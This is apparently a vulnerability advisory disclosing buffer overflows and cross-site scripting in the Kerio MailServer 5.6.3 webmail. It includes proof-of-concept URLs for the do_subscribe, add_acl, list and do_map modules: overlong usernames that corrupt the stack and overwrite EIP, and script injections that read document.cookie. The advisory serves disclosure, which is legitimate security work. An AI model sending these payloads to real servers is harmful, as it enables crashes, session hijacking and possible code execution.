Subject: Multiple buffer overflows and XSS in Kerio MailServer


Issue :

Multiple buffer overflows and XSS in Kerio MailServer

Version affected

5.6.3 ( last in kerio website )

Vendor status :

Vendor was notified

Description :

Kerio develop a mail server with support for Imap , Pop3, Smtp and SSL
protocols . Besides , it includes a webmail . This webmail is vulnerable
to basic cross site scriting attacks and buffer overflows that can lead to
a session hijacking or executing code with system privileges .

do_subscribe module

A long user name causes a total stack corruption and an access violation .
Three bytes of a thread instruction pointer EIP are overwriten with our
user name supplied , thus making easy to execute code

http://[server]/do_subscribe?showuser=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAA

add_acl module

Due to insufficient saninization of variables passed to module that appear
on the screen is possible to inject a script to be executed in the context
of the webmail

http://[server]/add_acl?folder=~conde0@...alhost/INBOX&add_name=<script>alert(document.cookie);</script>
If we set as folder ~admin@...alhost/INBOX and click it the mail server
will stop with an access violation .

Besides , add_acl module is affected as well by the problem of long user
names

http://[server]/add_acl?folder=~AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@localhost/INBOX&add_name=lucas

The crash ocurrs in the same way , sign that is the same function what is
causing the error .

list module

http://[Server]/list?folder=~AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@localhost/INBOX

The same buffer overflow .

do_map module

Due to insufficient saninization of variables passed to module that appear
on the screen is possible to inject a script to be executed in the context
of the webmail

http://[Server]/do_map?action=new&oldalias=eso&alias=<script>alert(document.cookie);</script>&folder=public&user=lucascavadora
Besides is vulnerable when using long user names

http://[Server]/do_map?
action=new&oldalias=eso&alias=aaa&folder=public&user=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAA

For these buffer overflows to be exploitable you need an account in the
webmail , but an intruder can build a link with code to execute and wait
for the click of a user with an open session in Kerio mailserver .
